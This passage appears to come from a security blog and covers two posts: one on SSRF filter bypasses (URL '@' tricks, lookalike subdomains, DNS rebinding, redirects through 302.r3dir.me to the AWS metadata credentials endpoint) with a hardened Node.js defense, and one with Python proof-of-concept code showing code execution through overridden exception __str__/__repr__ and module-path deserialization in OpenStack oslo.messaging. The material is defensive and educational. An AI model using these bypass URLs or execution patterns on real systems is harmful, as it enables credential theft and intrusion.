https://trusted.example.com, the request is blocked. The problem: string matching on URLs can be easily fooled by crafty URL formatting. Attackers often exploit the @ notation in URLs to bypass such checks. In an HTTP URL, anything before an @ symbol is treated as user credentials (userinfo) for authentication, and the actual host comes after the @. For example:\nIntended safe URL: https://trusted.example.com/path/file.txt Malicious URL using @: https://trusted.example.com@evil.attacker-site.com/path/file.txt At a glance, the malicious URL starts with https://trusted.example.com, so a naive startsWith() check passes. However, the true hostname of this URL is evil.attacker-site.com (the portion after the @). The prefix trusted.example.com is simply interpreted as a username by the URL parser. As a result, the server will actually perform the request to the attacker‚Äôs domain, not the trusted domain ‚Äì a successful SSRF bypass.\nReal-world case study: The open-source ChatGPT-Next-Web project once implemented an SSRF fix using a prefix allowlist for certain API endpoints. It checked that user-supplied URLs began with allowed host prefixes (e.g. a list of trusted WebDAV service URLs). Security researchers discovered this was insufficient. Because the code didn‚Äôt enforce a delimiter after the allowed domain, an attacker could append an allowed prefix onto a malicious domain string. For example, if https://webdav.yandex.com was allowed, an attacker could use https://webdav.yandex.com.attacker.tld/evil ‚Äì which passes the .startsWith() check but actually points to attacker.tld. In ChatGPT-Next-Web‚Äôs case, this loophole enabled arbitrary HTTPS requests to attacker-controlled servers despite the allowlist ‚Äúfix.‚Äù In short, simple prefix checks can be trivially bypassed by including the trusted string in a larger malicious hostname.\n2. Shallow Hostname Validation and Subdomain Tricks A slightly better approach is to actually parse the URL and inspect the hostname. For example, using Node‚Äôs url.parse() or the WHATWG URL API, one might extract the hostname and compare it to an allowlist:\nconst parsed = new URL(userUrl); if (parsed.hostname !== \u0026#34;trusted.example.com\u0026#34;) { throw new Error(\u0026#34;Hostname not allowed\u0026#34;); } This fixes the @ issue ‚Äì since parsed.hostname of https://trusted.example.com@evil.com would correctly yield evil.com. However, developers must still be careful: string comparison of hostnames has its own edge cases. Consider subdomains and lookalikes. If the intention is to allow only a specific host, you should ensure exact match (or a well-defined pattern). Attackers can register malicious domains that include or mimic allowed names. For instance:\nAllowed host: api.mycompany.com Attacker registers: api.mycompany.com.evil.org (a subdomain of evil.org). A check that naively does endsWith(\u0026quot;api.mycompany.com\u0026quot;) or contains that string could be fooled. Even checking for .mycompany.com could be tricked by a domain like really-trusted.mycompany.com.evil.org. The ChatGPT-Next-Web exploit above is a prime example of subdomain prefix abuse. The lesson is to anchor your host validation ‚Äì e.g., ensure the entire hostname matches an allowlist entry, or if subdomains of an allowed domain are acceptable, use strict suffix matching that accounts for dot boundaries (like *.example.com but not example.com.evil.com).\nAnother often-overlooked aspect is DNS resolution: Just because a URL‚Äôs hostname looks legitimate doesn‚Äôt mean it will resolve to the expected IP. In a DNS rebinding scenario, an attacker controls a domain and can manipulate its DNS responses. Your server might check parsed.hostname against an allowlist of, say, attacker‚Äôs domain (which obviously won‚Äôt be in the allowlist). But consider if the allowlist is for external hosts only (to block internal IPs) ‚Äì an attacker‚Äôs domain could resolve to a private IP after initial validation. For example, a filter might allow any hostname that resolves to a public IP, using a function like is_external(host). The attacker‚Äôs domain could initially resolve to a benign public IP for the check, then a second DNS query (when the request is made) returns 127.0.0.1. If the code isn‚Äôt carefully using the same resolved result, this DNS rebinding can route a seemingly external hostname to internal resources. Proper mitigations involve resolving the hostname to an IP once and validating that IP (and perhaps even forcing the request to that IP), or performing continuous checks if multiple connections occur.\nFinally, watch out for alternative IP notations. If your code blocks explicit localhost strings or literal 127.0.0.1, an attacker might supply 2130706433 (which is 0x7F000001 in decimal ‚Äì the same loopback IP in a different form) or even an IPv6 loopback ::1. Any robust solution should normalize and validate addresses, not rely solely on string matching for IPs.\n3. Inadequate Redirect Handling HTTP redirection can completely undermine SSRF filters that don‚Äôt account for it. Many HTTP client libraries (Axios, requests, etc.) follow redirects automatically by default. That means your backend might fetch a URL that responds with a 301/302 redirect, and the client will transparently fetch the new location. If your SSRF defense only checks the initial URL, an attacker can easily bounce the request through an intermediate site.\nFor example, suppose your application only allows downloading from https://cdn.safe-files.com. An attacker finds that cdn.safe-files.com (or an allowed domain) has an open redirect vulnerability, or they use a purpose-built redirect service like 302.r3dir.me. The attacker crafts a URL to the allowed domain that immediately redirects to a malicious or internal address. Your code sees the allowed domain in the request URL and permits it, but then the server follows the redirect to the forbidden target. By the time the dust settles, your server has made a call to the internal resource ‚Äì SSRF success.\nA practical demonstration of this uses the service 302.r3dir.me, which is designed to aid SSRF testing by redirecting to a target provided in the URL query. Imagine the target is the AWS EC2 metadata URL http://169.254.169.254/latest/meta-data/iam/security-credentials/. An attacker could submit:\nhttps://your-allowed-cdn.com@302.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/iam/ This single URL incorporates both the @ trick (to satisfy a naive prefix check) and a redirect to the internal AWS metadata service. If the server follows it, the response will be AWS credentials from the metadata! In our example test suite, a similar payload https://cdn.example.com@302.r3dir.me/--to/?url=http://intranet.com/ was used to simulate a redirect-based bypass. Without proper safeguards, such a request would slip past an allowlist and hit the final target. Indeed, it‚Äôs been noted that using 302.r3dir.me (or a custom redirect server) can bypass poorly implemented SSRF defenses, granting access to internal networks and metadata endpoints.\nTo make matters worse, scheme enforcement can be bypassed via redirects as well. Some developers try to allow only https:// URLs for extra safety (to avoid cleartext or other protocols). But if redirects aren‚Äôt controlled, an attacker can start with an https:// URL that later redirects to an http:// URL. Many HTTP libraries will follow an HTTPS-to-HTTP redirect unless explicitly configured not to. As Leviathan Security researchers pointed out, this trick enables attackers to ultimately reach internal HTTP services (which many backend systems and cloud metadata endpoints use) even if the initial URL was HTTPS. Without a redirect limit, your ‚ÄúHTTPS-only‚Äù rule might only apply to the first hop ‚Äì after that, all bets are off.\n4. Other Advanced Bypass Techniques Beyond the big three (prefix tricks, subdomain exploits, and redirects), there are other creative ways SSRF filters have been bypassed:\nMixed IP/Domain Formats: Some browsers/clients allow URLs like http://127.0.0.1.xip.io or http://[::ffff:127.0.0.1]. These appear as hostnames or IPv6, but effectively point to IPv4 localhost. If a filter isn‚Äôt comprehensive (e.g., only checks for ‚Äú127.0.0.1‚Äù literal), these can sneak through. HTTP Headers Injection (Less Common): In rare cases, if user input is directly concatenated into an HTTP request, an attacker might insert header delimiters to alter the request. This is more of an input parsing flaw than SSRF bypass per se, but it underscores the need to use proper libraries for requests. Alternate Schemes (Gopher, File): Although most SSRF patches focus on HTTP/HTTPS, remember that if your request function supports other schemes, an attacker might use file:// to read files or gopher:// for tricky interactions. Many SSRF exploits of the past used gopher to poke at internal memcached or other services. Ensuring you only allow the protocols you intend is vital (and usually that‚Äôs just HTTP/HTTPS for web apps). In summary, many of the ‚Äúsimple‚Äù SSRF fixes found online do not account for these edge cases. A patch might block obvious malicious URLs but still be bypassable by an imaginative attacker. As developers, we have to think like attackers when designing validations. Next, we‚Äôll look at how to build a more robust SSRF defense step by step, using Node.js as an example.\nBuilding a Robust SSRF Defense (Node.js Example) To truly fix SSRF, a single check is not enough. You‚Äôll want to validate the request URL at multiple layers and use secure library features to avoid mistakes. Let‚Äôs walk through a hardened approach using Node.js (Express + Axios), incorporating the lessons from above.\nBelow is an example of secure coding for a file download endpoint that only allows files from a specific CDN domain. This approach uses URL parsing, an allowlist, interceptors, and strict request options to mitigate SSRF:\nimport axios from \u0026#34;axios\u0026#34;; import { URL } from \u0026#34;url\u0026#34;; import express from \u0026#34;express\u0026#34;; const R = express.Router(); const ALLOWED_HOSTS = [\u0026#34;cdn.example.com\u0026#34;]; // Whitelisted hostname(s) // Create an Axios instance with a short timeout const downloader = axios.create({ timeout: 10000 }); // Attach a request interceptor to enforce URL policies downloader.interceptors.request.use(config =\u0026gt; { const u = new URL(config.url, config.baseURL); // Enforce HTTPS protocol and allowed hostname if (u.protocol !== \u0026#34;https:\u0026#34; || !ALLOWED_HOSTS.includes(u.hostname)) { return Promise.reject(new Error(`Blocked hostname: ${u.hostname}`)); } return config; }); R.get(\u0026#34;/file-proxy/download\u0026#34;, async (req, res) =\u0026gt; { const url = req.query.url; const fname = req.query.file_name; if (!url || !fname) { return res.status(400).send(\u0026#34;Missing parameters\u0026#34;); } try { const resp = await downloader.get(url, { responseType: \u0026#34;stream\u0026#34;, maxRedirects: 0, // Disallow redirects //validateStatus: status =\u0026gt; status \u0026lt; 400 // Treat 3xx as success (so we catch them manually) }); // Set download headers res.setHeader(\u0026#34;Content-Disposition\u0026#34;, `attachment; filename=${encodeURIComponent(fname)}`); res.setHeader(\u0026#34;Content-Type\u0026#34;, resp.headers[\u0026#34;content-type\u0026#34;] || \u0026#34;application/octet-stream\u0026#34;); // Pipe the response stream directly to the client resp.data.pipe(res); } catch (e) { console.error(\u0026#34;Blocked or failed download:\u0026#34;, e.message); res.status(400).send(\u0026#34;Invalid or forbidden URL\u0026#34;); } }); Let‚Äôs break down how this implementation counters the earlier bypass techniques:\nURL Parsing and Host Allowlist: We use Node‚Äôs standard URL constructor to parse the requested URL (new URL(config.url)). This ensures we correctly identify the components of the URL. By checking u.protocol and u.hostname, we eliminate confusion around tricky formats. For example, u.hostname for https://cdn.cloudfront.net@evil.com/... will be evil.com, so the interceptor will reject it. We only allow hostnames explicitly listed in ALLOWED_HOSTS. In this case, the only allowed host is the specific CloudFront domain we trust. If an attacker tries any other host (including subdomains or lookalikes), the request is blocked before it is even sent.\nHTTPS-Only Enforcement: The interceptor also checks u.protocol !== \u0026quot;https:\u0026quot; and rejects anything that isn‚Äôt HTTPS. This means no http:// (preventing downgrade attacks) and no weird schemes like file:// ‚Äì they‚Äôll be blocked immediately. One thing to note: by itself this HTTPS check could be bypassed by an HTTPS URL that redirects to HTTP (as discussed earlier). That‚Äôs why we also set maxRedirects: 0 on the request ‚Äì to prevent any protocol change via redirect.\nDisabling Redirects: Setting maxRedirects: 0 tells Axios not to follow redirects at all. If the response is a 302 or other redirect, Axios will return it directly without chasing the Location. In our code, we treat any HTTP status \u0026gt;= 300 as an error (by using a custom validateStatus that only considers \u0026lt;400 as okay). This way, a redirect from the allowed host to an unallowed host is caught: the allowed host responded with a redirect, but we didn‚Äôt follow it ‚Äì instead we throw an error and return ‚ÄúInvalid URL.‚Äù This intercepts the scenario of using an open redirect or r3dir.me. In our test, for example, if cdn.example.com tried to redirect to evil.com, our server would not follow; we‚Äôd catch it and respond with 400. Note: In some cases, you might allow a limited number of redirects but need to validate each hop ‚Äì that gets complicated fast. It‚Äôs safer to disallow redirects for user-supplied URLs unless absolutely necessary.\nCentralized Enforcement via Interceptor: By using an Axios request interceptor, we ensure the policy is applied consistently for every request made with that downloader instance. This is better than scattering checks around or relying on developers to always call a validation function. It‚Äôs a form of defense-in-depth in code ‚Äì even if someone forgets to do a manual check before calling downloader.get(), the interceptor will kick in. It also makes the code cleaner in the route handler ‚Äì we simply call downloader.get(url) and know that the interceptor will block any disallowed URL upfront.\nTimeout and Error Handling: While not directly an SSRF bypass issue, we set a reasonable timeout (10 seconds here) on the Axios instance to avoid hanging on slow or non-responsive endpoints. We also gracefully handle errors: any thrown error (be it from our interceptor or the request itself) results in a 400 response to the client and logs an error. The error message can indicate why it was blocked (e.g., ‚ÄúBlocked hostname: evil.com‚Äù), which can be useful in detecting attacks in logs, but be careful not to leak too much detail to end-users.\nContent Considerations: In this snippet, after a successful response, we pipe the content out as a download (attachment; filename=...). We trust the allowed source to provide legitimate content. If additional validation of the content type or size is needed (for example, ensure it‚Äôs actually a PDF or under certain size), that can be added before piping. The primary focus here is on securing the request against SSRF exploits.\nWith the above measures in place, our Express endpoint would have passed the earlier test cases that defeated the naive implementation. The startsWith-based filter was bypassable with @ and open redirects; our new implementation isn‚Äôt, because it checks the true hostname and disallows redirects entirely. In fact, using a nearly identical test suite:\nWhitelisted domain allowed: A normal URL to the allowed CDN succeeds (status 200 OK). @ redirect payload blocked: The malicious ...cloudfront.net@302.r3dir.me/... URL is rejected with a 400 and logged (our interceptor sees hostname = 302.r3dir.me, which is not allowed). Direct external domain blocked: A URL to https://evil.com/... is immediately blocked by hostname check (not in allowlist). Allowed host redirecting to evil blocked: If the allowed CDN tries to redirect (we simulate with a 302 via nock in testing), the request is not followed and we return 400. By using proper URL parsing and enforcing policies at the HTTP client level, we‚Äôve significantly reduced the SSRF risk. But we‚Äôre not done yet ‚Äì truly secure SSRF defense means multiple layers of checks.\nDefense-in-Depth: Additional Safeguards The code-level protections above are a strong start. However, savvy attackers might still look for gaps, especially in complex real-world environments. Here are additional defense-in-depth measures that you (and your security team) should consider:\nValidate DNS Resolution and IP Ranges: Even after hostname allowlisting, it‚Äôs wise to double-check where the domain resolves to. For instance, ensure the IP address of the allowed host is in a range you expect. If your server is running in a cloud environment, be mindful that some cloud hostnames could resolve to internal IPs. Implement a DNS lookup and verify the resulting IP is not a private/internal address (RFC1918 ranges, localhost, link-local, etc.) before making the request. This prevents scenarios where an allowed domain is hijacked or a DNS rebinding tricks the server into targeting an internal IP. Many languages have libraries or functions (like Python‚Äôs ipaddress module or Golang‚Äôs net package) to check if an IP is in a private network. In Node, you might use dns.promises.lookup and then inspect the IP. Be cautious to do the lookup and request in a way that avoids race conditions (the interceptor approach above could be extended with a custom DNS resolver that filters IPs).\nNetwork Egress Filtering (CIDR Allow/Deny Lists): Don‚Äôt rely solely on application code to enforce SSRF protection. Network-level controls can provide a safety net. For example, if your service should only call a specific external API or CDN, configure firewall rules or a cloud security group to block all other outbound requests. Many cloud providers and container orchestration platforms allow egress restrictions. A Web Application Firewall (WAF) or API gateway can also be configured with rules to prevent traffic to internal IP ranges, adding another layer of defense beyond the app logic.\nLimit Allowed Ports and Protocols: If your use-case is only to fetch HTTP/S on standard ports, consider restricting that. An SSRF attacker may try to hit non-HTTP services (like http://target:22/ to check an SSH server banner, or other ports for port scanning). Your HTTP client might not speak those protocols, but even connecting can yield information. You can often specify allowed ports or disallow non-80/443 in your allowlist policy. Some frameworks let you enforce this in the URL parser (for example, by checking u.port or requiring u.port is blank or 443/80 if https/http). Similarly, ensure only http and https schemes ‚Äì no ftp:, no file: ‚Äì are ever accepted.\nLogging and Alerting: Treat SSRF attempt logs as high-severity events. In our code above, we do console.error logging when a download is blocked. In production, you‚Äôd want to funnel such logs to a monitoring system. If you see repeated ‚ÄúBlocked hostname: 169.254.169.254‚Äù or the like, that‚Äôs a red flag someone is probing for SSRF. Set up alerts for these patterns. Comprehensive access logs that include the requested URL (or at least the domain) can help incident response trace what an attacker tried to do. Remember that sometimes SSRF is blind (the attacker doesn‚Äôt get the response directly), so they might be fuzzing your endpoint and watching side-effects. Good logging might be your only clue something is amiss.\nSecurity Testing and Automation: Given the myriad ways to bypass SSRF filters, it‚Äôs important to continuously test your defenses. Incorporate SSRF test cases into your QA or CI/CD pipeline. For example, the test suite we showed earlier programmatically tries an @ payload and an open redirect to ensure the server returns 400, not 200. You can leverage security scanning tools or write unit tests for your validation logic. Static analysis can help too ‚Äì for instance, using Semgrep or CodeQL queries to detect any use of dangerous patterns (like raw axios.get(userInput) without validation). Organizations should also perform periodic penetration testing. Tools like Burp Suite have SSRF payload lists and can automate trying dozens of variants (encoded IPs, etc.) against your endpoints. Make sure your ‚Äúsafe‚Äù code actually holds up against these.\nKeep Dependencies and Knowledge Updated: The ecosystem around SSRF is evolving. New bypass tricks get discovered (for example, novel URL parsing quirks in different languages or odd behavior in cloud metadata services). Stay updated on security advisories ‚Äì for instance, the nossrf npm package was created to prevent SSRF, but even it had a critical bypass discovered. Always use the latest patched versions of any libraries or packages related to URL fetching, and review their changelogs for security fixes. And of course, never disable critical protections like certificate verification on your HTTP client ‚Äì doing so could let an attacker intercept your ‚Äúsafe‚Äù requests or present fake certificates.\nIn essence, defense-in-depth means assuming one layer of defense could fail, so you have others to mitigate the impact. We saw how relying just on a prefix check failed; combining hostname + protocol + redirect controls in the code made it much harder to bypass. Adding network rules and continuous testing makes it harder still. The more hurdles an attacker has to jump through, the more likely they‚Äôll give up or slip up and get detected.\nConclusion: Never Trust a ‚ÄúOne-Size-Fits-All‚Äù SSRF Fix There is no silver bullet.\nNot in folklore. Not in security. Security isn‚Äôt a one-liner ‚Äî it‚Äôs a process: Think. Test. Break. Fix. Repeat.\nSSRF vulnerabilities teach us a broader lesson in software security: beware of silver-bullet fixes. If you find a code snippet online claiming ‚Äújust do X to fix SSRF‚Äù without accounting for edge cases, be skeptical. We‚Äôve highlighted how even widely suggested or ‚Äúsecure‚Äù patches can be incomplete ‚Äì from ChatGPT-Next-Web‚Äôs initial fix being bypassed to the simple allowlist that failed against @ and redirect tricks. Attackers think outside the box, so our defenses must as well.\nSSRF Defense Lab: Practical Testbed Looking to verify your SSRF defenses in practice? Check out the open-source SSRF Defense Lab I created:\nüß™ Minimal, self-contained Node.js/Express testbed for SSRF security üîß Secure and vulnerable router examples with real bypass test cases üõ†Ô∏è Automated test utilities for CDN/domain allowlisting, redirect bypass, and more üìã All tests must pass for a router to be considered secure Project highlights:\nReusable SSRF security test utilities Secure/vulnerable router code and tests Covers common bypasses: @ tricks, open redirects, non-whitelisted domains Easy to run: npm install \u0026amp;\u0026amp; npm test Source \u0026amp; docs: github.com/windshock/ssrf-defense-lab\nFor developers and security engineers, the key takeaways are:\nKey Takeaways Always validate and sanitize user-controlled URLs. Rely on proven libraries for parsing‚Äînever trust raw string checks. Layer your defenses. Combine hostname allowlists, protocol checks, DNS/IP validation, and strict redirect handling. Test like an attacker. Challenge your own defenses with real-world bypass payloads and automated tests. Adopt defense-in-depth. Use both application logic and network-layer controls to reduce risk and monitor for abuse. Stay ahead of new tricks. Security is never finished‚Äîkeep learning, updating, and adapting. Preventing SSRF isn‚Äôt about a single fix‚Äîit‚Äôs about building resilient, layered defenses and never letting your guard down. Be proactive: review, test, and challenge your solutions regularly. If you don‚Äôt, someone else surely will. Secure by design, and let your defenses grow stronger with every lesson learned.\nReferences Bypassing SSRF Filters Using r3dir ‚Äî Leviathan Security Server-side request forgery (Wikipedia) Silver Bullet ‚Äì Archive.org Snyk Blog: Preventing SSRF in Node.js GitHub Patch (NextChat) NextChat SSRF Advisory (GitHub) SSRF Defense Lab (GitHub) ","permalink":"https://windshock.github.io/en/post/2025-06-25-ssrf-defense/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eNo Silver Bullet: Folklore \u0026amp; Modern Meaning\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThe phrase \u0026ldquo;no silver bullet\u0026rdquo; originated in European folklore, where silver bullets were believed to be uniquely effective against supernatural creatures like werewolves or vampires. The earliest documented use appears in Walter Scott\u0026rsquo;s 1816 \u003cem\u003eTales of My Landlord\u003c/em\u003e, and historical cases such as the 1765 Beast of G√©vaudan reference silver bullets as a last resort against mysterious threats. Over time, the expression evolved: today, \u0026ldquo;no silver bullet\u0026rdquo; means there is no single, simple solution to complex problems‚Äîa message popularized in software engineering by Fred Brooks\u0026rsquo; 1986 essay. This post applies that lesson to SSRF defense: beware of one-size-fits-all fixes, and look deeper than folklore or quick patches.\u003c/p\u003e","title":"The Limitations of 'Secure' SSRF Patches: Advanced Bypasses and Defense-in-Depth"},{"content":"Author: Hyeongkwan Lee\nEmail: windshock@gmail.com\nGitHub: https://github.com/windshock\nLinkedIn: https://www.linkedin.com/in/windshock/\nBlog: https://windshock.github.io\nXML-RPC Security Series:\nSeries 1 - XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies Series 2 - CVE-2019-17570: Apache XML-RPC Exploit Series 3 - Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned Overview This report analyzes theoretical Remote Code Execution (RCE) risks related to exception serialization and deserialization in OpenStack Nova\u0026rsquo;s use of the oslo.messaging library. The goal is not to claim that practical RCE is easily achievable, but to help security engineers and developers recognize anti-patterns and learn from them. Multiple real-world safeguards (such as module whitelisting, message broker isolation, and secure logging practices) make actual exploitation highly unlikely in production OpenStack environments. The following PoC scenarios are intended for educational purposes, to illustrate how insecure exception handling patterns could become risky if other defenses are misconfigured or absent.\nKey Findings Note: These PoCs are for educational demonstration of risky exception handling patterns. In real OpenStack deployments, multiple safeguards make actual exploitation highly unlikely.\n‚úÖ PoC 1 ‚Äì __str__ Override with eval(str(e)) (Theoretical Example) This proof-of-concept demonstrates, in a controlled example, that when an exception class overrides its __str__() method to return a malicious string, any call to eval(str(e)) could theoretically result in Remote Code Execution. In practice, such a pattern should never appear in production code, and OpenStack\u0026rsquo;s architecture includes multiple layers of defense.\nclass Evil(Exception): def __str__(self): return \u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;touch /tmp/from_str_eval\u0026#39;)\u0026#34; eval(str(Evil())) # Triggers RCE ‚úÖ PoC 2 ‚Äì __str__ Returns JSON Payload + eval (Theoretical Example) This variant shows, for educational purposes, how a __str__() method returning a JSON-encoded payload could, if mishandled, lead to code execution if the parsed content is used in an eval() call. Again, this is not a pattern seen in well-designed production systems, but highlights why input validation and secure exception handling are important.\nclass Evil(Exception): def __str__(self): return \u0026#39;{\u0026#34;payload\u0026#34;: \u0026#34;__import__(\\\u0026#39;os\\\u0026#39;).system(\\\u0026#39;touch /tmp/json_rce\\\u0026#39;)\u0026#34;}\u0026#39; data = json.loads(str(Evil())) eval(data[\u0026#34;payload\u0026#34;]) # Triggers RCE ‚úÖ PoC 3 ‚Äì eval(repr(e)) (Theoretical Example) This PoC demonstrates, as a theoretical risk, that repr() can also be overridden to return arbitrary content. If any part of the system executes eval(repr(obj)) without ensuring that obj is a safe type, code execution could occur. This underscores that both __str__ and __repr__ must be considered attack surfaces in code reviews.\nclass Evil: def __repr__(self): return \u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;touch /tmp/hacked\u0026#39;)\u0026#34; eval(repr(Evil())) # RCE ‚úÖ PoC 4 ‚Äì Trigger via serialize_remote_exception() (Theoretical Example) Here, the PoC illustrates that if OpenStack\u0026rsquo;s serialize_remote_exception() function were to call str(e) on a malicious exception object, code execution could theoretically occur. In practice, OpenStack\u0026rsquo;s design and deployment mitigations make this scenario extremely unlikely.\nimport sys import os from oslo_messaging._drivers import common as exceptions class EvilError(Exception): def __str__(self): os.system(\u0026#34;touch /tmp/hacked\u0026#34;) return \u0026#34;rce via serialize\u0026#34; try: raise EvilError(\u0026#34;boom\u0026#34;) except Exception: exc_info = sys.exc_info() serialized = exceptions.serialize_remote_exception(exc_info) print(\u0026#34;File created:\u0026#34;, os.path.exists(\u0026#34;/tmp/hacked\u0026#34;)) ‚Üí Malicious __str__() is executed within the serializer. ‚úÖ PoC 5 ‚Äì Race Condition with Threads (Theoretical Example) This experiment simulates a theoretical race condition scenario in which multiple threads concurrently deserialize and serialize exception objects. The test proves that when two threads (a producer and a consumer) access shared exceptions via a queue, the serializer thread may trigger str(ex) on a malicious object before it has been fully sanitized. As discussed below, this is not a realistic risk in actual OpenStack deployments.\nNote: In actual OpenStack oslo.messaging and Nova implementations, global variables or direct sharing of exception objects across threads or processes does not occur. Exception objects are always serialized and deserialized across process or network boundaries, meaning each thread or process works with its own instance. Therefore, the race condition demonstrated in this PoC does not represent a realistic risk in real-world OpenStack environments. This PoC should be considered a theoretical demonstration of Python concurrency issues, not a practical exploit vector for OpenStack.\nThis demonstrates the danger of using shared resources and exception objects across asynchronous or threaded boundaries without protective synchronization or trust boundaries. Even in environments with the GIL, race windows can expose critical bugs.\nLimitations of This PoC This PoC assumes shared mutable global state (hit_count), which is not typically used in production code.\nPython\u0026rsquo;s Global Interpreter Lock (GIL) limits true concurrency, so race conditions in CPython are often timing-dependent and may be less predictable.\nThe Boom object is explicitly crafted and passed across a shared queue without serialization boundaries; in real deployments, such objects would typically be serialized/deserialized across process or network boundaries, limiting direct reference reuse.\nNevertheless, this PoC illustrates the class of timing-sensitive bugs that arise from deserialization and stringification of attacker-influenced objects in multi-threaded environments.\nimport threading import os import time import random from queue import Queue import queue # for queue.Full exception # Shared resources hit_count = 0 ex_queue = Queue(maxsize=5) class Boom(Exception): def __str__(self): global hit_count local_count = hit_count print(f\u0026#34;Thread {threading.current_thread().name} reading hit_count={local_count}\u0026#34;) time.sleep(random.uniform(0.001, 0.003)) # 1ms ~ 3ms delay hit_count = local_count + 1 print(f\u0026#34;Thread {threading.current_thread().name} set hit_count={hit_count}\u0026#34;) os.system(f\u0026#34;touch /tmp/hacked_race_{hit_count}_thread_{threading.current_thread().name}\u0026#34;) return f\u0026#34;boom_{hit_count}\u0026#34; def deserializer(): global hit_count while hit_count \u0026lt; 5: ex = Boom() print(f\u0026#34;Thread {threading.current_thread().name} created Boom\u0026#34;) try: ex_queue.put(ex, timeout=0.1) time.sleep(random.uniform(0.001, 0.003)) except queue.Full: time.sleep(random.uniform(0.001, 0.003)) continue def serializer(): global hit_count while hit_count \u0026lt; 5: try: ex = ex_queue.get(timeout=0.3) print(f\u0026#34;Thread {threading.current_thread().name} got Boom, calling str\u0026#34;) str(ex) # Triggers Boom.__str__ time.sleep(random.uniform(0.001, 0.003)) except Queue.Empty: time.sleep(random.uniform(0.001, 0.003)) continue # Minimal thread setup threads = [ threading.Thread(target=deserializer, name=f\u0026#34;Deserializer-{i}\u0026#34;) for i in range(2) ] + [ threading.Thread(target=serializer, name=f\u0026#34;Serializer-{i}\u0026#34;) for i in range(3) ] for t in threads: t.start() for t in threads: t.join(timeout=5) print(\u0026#34;Final hit_count:\u0026#34;, hit_count) print(\u0026#34;Generated files:\u0026#34;, sorted([f for f in os.listdir(\u0026#34;/tmp\u0026#34;) if f.startswith(\u0026#34;hacked_race_\u0026#34;)])) OpenStack-specific Vulnerability Context The vulnerable functions serialize_remote_exception() and deserialize_remote_exception() are part of the oslo.messaging library, not Nova itself. Nova uses them as part of its RPC communication and error-handling infrastructure. These functions are located in oslo_messaging/_drivers/common.py and are called by various RPC transport mechanisms. Because oslo.messaging is a shared library across OpenStack services, this vulnerability has implications beyond Nova if other components reuse the same serialization logic.\nserialize_remote_exception() This function serializes Python exceptions into a dictionary format for RPC transport. One critical line calls str(failure), which is the same as str(ex). If the exception object has an overridden __str__() method with side effects, this call can trigger arbitrary code execution. This makes the serialization process itself a potential RCE entry point, especially if exceptions are passed from untrusted sources or deserialized objects.\ndata = { \u0026#39;class\u0026#39;: cls_name, \u0026#39;module\u0026#39;: mod_name, \u0026#39;message\u0026#39;: str(failure), \u0026#39;tb\u0026#39;: tb, \u0026#39;args\u0026#39;: failure.args, \u0026#39;kwargs\u0026#39;: kwargs } deserialize_remote_exception() This function dynamically imports and reconstructs exception classes from RPC responses. It uses the module and class fields in the serialized data to locate the exception class and instantiate it with the provided arguments. While Nova restricts deserialization via allowed_remote_exmods, any misconfiguration or unsafe exception content (such as crafted __str__() methods) can still result in dangerous behavior if the reconstructed exception is logged or stringified later.\n_EXCEPTIONS_MODULE = \u0026#39;builtins\u0026#39; _EXCEPTIONS_MODULES = [\u0026#39;exceptions\u0026#39;, \u0026#39;builtins\u0026#39;] if module in _EXCEPTIONS_MODULES: module = _EXCEPTIONS_MODULE if module != _EXCEPTIONS_MODULE and module not in allowed_remote_exmods: return RemoteError(name, message, traceback) mod = importutils.import_module(module) klass = getattr(mod, name) if not issubclass(klass, Exception): raise TypeError(...) exc = klass(*args, **kwargs) These functions expose str(e) as a potential RCE entry point if attacker-controlled classes are deserialized and logged.\nOpenStack Products and Custom Exception Namespaces In some OpenStack products such as Ironic, exceptions are not limited to the Python builtins but are often defined in product-specific namespaces. For example, Ironic and related components use their own exception modules, and the list of allowed exception namespaces may include values like:\nallowed_exception_namespaces = [ \u0026#39;ironic_lib.exception.\u0026#39;, \u0026#39;ironic.common.exception.\u0026#39;, \u0026#39;ironic_inspector.utils.\u0026#39; ] See: Ironic JSON RPC Reference\nDue to Python\u0026rsquo;s import path resolution, if a local file exists that matches the expected module path (e.g., ironic/common/exception.py), that local file will be imported first. This means that if an attacker is able to upload or place a malicious exception file at the expected path, it could be loaded during deserialization. For example:\nfrom ironic.common import exception from oslo_messaging._drivers import common as exceptions e = \u0026#39;{\u0026#34;class\u0026#34;: \u0026#34;MyException\u0026#34;, \u0026#34;module\u0026#34;: \u0026#34;ironic.common.exception\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;\\uc5d0\\ub7ec: test\u0026#34;, \u0026#34;tb\u0026#34;: [\u0026#34;MyException: \\uc5d0\\ub7ec: test\\n\u0026#34;], \u0026#34;args\u0026#34;: [\u0026#34;test\u0026#34;], \u0026#34;kwargs\u0026#34;: {}}\u0026#39; sys.modules[\u0026#39;ironic.common.exception\u0026#39;] # \u0026lt;module \u0026#39;ironic.common.exception\u0026#39; from \u0026#39;./ironic/common/exception.py\u0026#39;\u0026gt; exceptions.deserialize_remote_exception(e,[\u0026#39;ironic.common.exception\u0026#39;]) # execute init # MyException_Remote(\u0026#39;test\u0026#39;) Contents of ironic/common/exception.py:\nclass MyException(Exception): def __init__(self, msg): print(\u0026#34;execute init\u0026#34;) self.msg = msg def __str__(self): print(\u0026#34;execute str\u0026#34;) return f\u0026#34;error: {self.msg}\u0026#34; MyException(\u0026#34;test\u0026#34;) This demonstrates that deserialization can instantiate attacker-controlled exception classes if the import path can be influenced or a malicious file is present locally.\nChallenges to Exploitation Requires access to the message broker (e.g., RabbitMQ)\nTainted exception object must survive to a point where it is formatted\nOnly classes in allowed_remote_exmods can be instantiated\nMany logging systems use exc_info=True, avoiding str(e)\nHowever, misconfigured systems, improper logging, or overbroad whitelisting may create a realistic attack path.\nRecommendations Strictly define and audit allowed_remote_exmods\nNever str() or repr() exception objects directly in logs\nPrefer logging frameworks with exc_info=True\nSanitize all exception message content\nUse RemoteError as a fallback to avoid importing user-defined classes\nReview thread concurrency behaviors in RPC exception handling paths\nRelated References and Resources OpenStack Trove RPC Security Specification\nhttps://specs.openstack.org/openstack/trove-specs/specs/ocata/secure-oslo-messaging-messages.html\nZeroMQ Removal of Pickle Support (Launchpad 